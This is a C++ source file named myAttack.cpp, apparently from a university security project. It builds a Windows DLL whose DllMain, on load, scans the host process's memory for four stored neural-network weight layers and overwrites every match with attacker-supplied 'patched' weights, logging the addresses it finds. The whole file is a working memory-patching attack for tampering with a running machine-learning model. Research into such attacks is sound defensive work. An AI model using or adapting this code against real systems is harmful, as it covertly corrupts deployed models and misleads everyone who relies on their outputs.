// myAttack.cpp

#include <windows.h>
#include <iostream>
#include <string>
#include <algorithm>
#include <sstream>
#include <vector>
#include <fstream>
#define EXPORTING_DLL

#define LOG_FILE L"C:\\Users\\Logs\\"
#define REPO_BASE "C:\\Users\\Raphael\\test\\COMS-W6995-Project"
using namespace std;

int globcount = 0;

// citation http://www.cplusplus.com/forum/general/202725/
std::vector<const void*> scan_memory( void* address_low, std::size_t nbytes,
                                      const std::vector<BYTE>& bytes_to_find )
{
    std::vector<const void*> addresses_found ;

    // all readable pages: adjust this as required
    const DWORD pmask = PAGE_READONLY | PAGE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE |
        PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY ;

    MEMORY_BASIC_INFORMATION mbi;

    BYTE* address = static_cast<BYTE*>( address_low ) ;
    BYTE* address_high = address + nbytes ;

    while( address < address_high && ::VirtualQuery( address, &mbi, sizeof(mbi) ) )
    {
        // committed memory, readable, wont raise exception guard page
        // if( (mbi.State==MEM_COMMIT) && (mbi.Protect|pmask) && !(mbi.Protect&PAGE_GUARD) )
        if( (mbi.State==MEM_COMMIT) && !(mbi.Protect&PAGE_READONLY) && (mbi.Protect&pmask) && !(mbi.Protect&PAGE_GUARD) )
        {
            const BYTE* begin = static_cast<const BYTE*>(mbi.BaseAddress) ;
            const BYTE* end =  begin + mbi.RegionSize ;

            const BYTE* found = std::search( begin, end, bytes_to_find.begin(), bytes_to_find.end() ) ;
            while( found != end )
            {
                addresses_found.push_back( found ) ;
                found = std::search( found+1, end, bytes_to_find.begin(), bytes_to_find.end() ) ;
            }
        }

        address += mbi.RegionSize ;
        mbi = MEMORY_BASIC_INFORMATION();
    }

    return addresses_found ;
}



union pointerChar {
	int ptr;
	unsigned char c[4];
};


void WriteLog(char *text) {
	
	stringstream shootMe;
	shootMe << globcount;
	string mynum = shootMe.str();// ToString( (unsigned long)globcount);
	wstring logNum(mynum.length(), L' ');
	copy(mynum.begin(), mynum.end(), logNum.begin());
	wstring filename = L"Log";
	filename += logNum;
	filename += L".txt";
	globcount++;
	
	wstring path = LOG_FILE;
	path += filename;
	
	HANDLE hfile = CreateFileW(path.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD written;
	WriteFile(hfile, text, strlen(text), &written, NULL);
	WriteFile(hfile, "\r\n", 2, &written, NULL);
	CloseHandle(hfile);
}

// citation: https://stackoverflow.com/questions/15138353/how-to-read-a-binary-file-into-a-vector-of-unsigned-chars
vector<BYTE> vectorByteFile(const char* fname)
{
	ifstream binary(fname, ios::binary);
	
	// deal with newlines
	binary.unsetf(ios::skipws);
	
	// get size
	streampos binarySz;
	
	binary.seekg(0, ios::end);
	binarySz = binary.tellg();
	binary.seekg(0, ios::beg);
	
	// open and create space
	vector<BYTE> retVec;
	retVec.reserve(binarySz);
	
	retVec.insert(retVec.begin(), istream_iterator<BYTE>(binary), istream_iterator<BYTE>());
	
	return retVec;
}

// break neuron up into contiguous bytes
vector<vector<BYTE>> partitionVec(vector<BYTE> fileBytes, int vecSize) {
	vector<vector<BYTE>> retVec;
	
	for(vector<BYTE>::iterator it = fileBytes.begin(); it < fileBytes.end(); it += vecSize) {
		vector<BYTE> currVec (it, it+vecSize);
		retVec.push_back(currVec);
	}
	return retVec;
}
	
	

BOOL APIENTRY DllMain( HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved )
{
	// WriteLog("before file");
	
	
	vector<BYTE> w1_total = vectorByteFile(REPO_BASE "\\PDF\\w1.bin");
	vector<BYTE> w1_patch = vectorByteFile(REPO_BASE "\\PDF\\w1_patched.bin");
	
	// for garbage demo not used here
	vector<BYTE> w1_garbage(w1_total.size(), 0xff);
	
	vector<BYTE> w2_total = vectorByteFile(REPO_BASE "\\PDF\\w2.bin");
	vector<BYTE> w2_patch = vectorByteFile(REPO_BASE "\\PDF\\w2_patched.bin");
	
	vector<BYTE> w3_total = vectorByteFile(REPO_BASE "\\PDF\\w3.bin");
	vector<BYTE> w3_patch = vectorByteFile(REPO_BASE "\\PDF\\w3_patched.bin");
	
	vector<BYTE> w4_total = vectorByteFile(REPO_BASE "\\PDF\\w4.bin");
	vector<BYTE> w4_patch = vectorByteFile(REPO_BASE "\\PDF\\w4_patched.bin");
	
	
	// turns out tensors are sometimes contiguous in memory!!
	
	// patch first layer
	vector<const void *> found_addrs = scan_memory((void *) 0x1000000000, 0xf0000000000, w1_total);
	
	vector<const void *>::iterator it;
	
	if(found_addrs.size() == 0)
		WriteLog("Couldn't find one!!!");
	
	
	SIZE_T written = -1;
	
	for (it = found_addrs.begin(); 
			it < found_addrs.end(); it++){
		char simple_arr[10];
		sprintf(simple_arr, "%p\n", *it);
		WriteLog((char *) simple_arr);
		
		char *ptr = (char *)*it;
		
		CopyMemory((PVOID)*it, (const void *) &w1_patch[0], w1_patch.size());
	}

	// patch second layer
	found_addrs = scan_memory((void *) 0x1000000000, 0xf0000000000, w2_total);
	
	
	if(found_addrs.size() == 0)
		WriteLog("Couldn't find one!!!");
	
	
	written = -1;
	
	for (it = found_addrs.begin(); 
			it < found_addrs.end(); it++){
		char simple_arr[10];
		sprintf(simple_arr, "%p\n", *it);
		WriteLog((char *) simple_arr);
		
		char *ptr = (char *)*it;
		
		CopyMemory((PVOID)*it, (const void *) &w2_patch[0], w2_patch.size());
	}
	
	// patch third layer
	found_addrs = scan_memory((void *) 0x1000000000, 0xf0000000000, w3_total);
	
	
	if(found_addrs.size() == 0)
		WriteLog("Couldn't find one!!!");
	
	
	written = -1;
	
	for (it = found_addrs.begin(); 
			it < found_addrs.end(); it++){
		char simple_arr[10];
		sprintf(simple_arr, "%p\n", *it);
		WriteLog((char *) simple_arr);
		
		char *ptr = (char *)*it;
		
		CopyMemory((PVOID)*it, (const void *) &w3_patch[0], w3_patch.size());
	}
	
	// patch fourth layer
	found_addrs = scan_memory((void *) 0x1000000000, 0xf0000000000, w4_total);
	
	
	if(found_addrs.size() == 0)
		WriteLog("Couldn't find one!!!");
	
	
	written = -1;
	
	for (it = found_addrs.begin(); 
			it < found_addrs.end(); it++){
		char simple_arr[10];
		sprintf(simple_arr, "%p\n", *it);
		WriteLog((char *) simple_arr);
		
		char *ptr = (char *)*it;
		
		CopyMemory((PVOID)*it, (const void *) &w4_patch[0], w4_patch.size());
	}
	
	
   return TRUE;
}

extern "C" __declspec(dllexport) void HelloWorld()
{
   std::cout << "ran!!\n";
};

extern "C" __declspec(dllexport) int Test()
{
   return 5;
};